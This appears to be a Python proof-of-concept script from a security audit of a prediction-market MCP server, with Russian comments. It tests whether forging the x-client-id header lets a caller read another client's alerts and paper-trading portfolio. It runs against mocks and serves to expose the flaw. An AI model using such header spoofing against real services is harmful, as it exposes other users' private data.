"""INV-nn repro: может ли вызывающий прочитать чужие алерты/портфель."""
import asyncio, json
from unittest.mock import patch
from fastmcp import Client
from predmarket_mcp.server import mcp
from predmarket_mcp import deps

async def main():
    # Жертва создаёт watch и получает алерт.
    deps.create_watch("victim-corp", 0.0)
    # Жертва коммитит бумажную сделку (портфель = её стратегия).
    from core.models import Leg, Side, Venue
    deps.commit_paper_trade("victim-corp",
        [Leg(venue=Venue.KALSHI, market_id="kx-btc-100k-eoy26", side=Side.YES)], 5000)

    # АТАКУЮЩИЙ: просто подставляет заголовок x-client-id с чужим id.
    attacker_headers = {"x-client-id": "victim-corp"}
    with patch("fastmcp.server.dependencies.get_http_headers", return_value=attacker_headers):
        async with Client(mcp) as c:
            a = json.loads((await c.read_resource("alerts://victim-corp"))[0].text)
            p = json.loads((await c.read_resource("portfolio://victim-corp"))[0].text)
    print("ALERTS  ->", "ОТКАЗ" if a.get("error") else f"ПРОЧИТАНО, алертов: {a.get('count')}")
    print("PORTFOLIO ->", "ОТКАЗ" if p.get("error") else
          f"ПРОЧИТАНО, сделок: {len(p.get('trades', []))}, размер: ${p['trades'][0]['size_usd'] if p.get('trades') else '-'}")
asyncio.run(main())
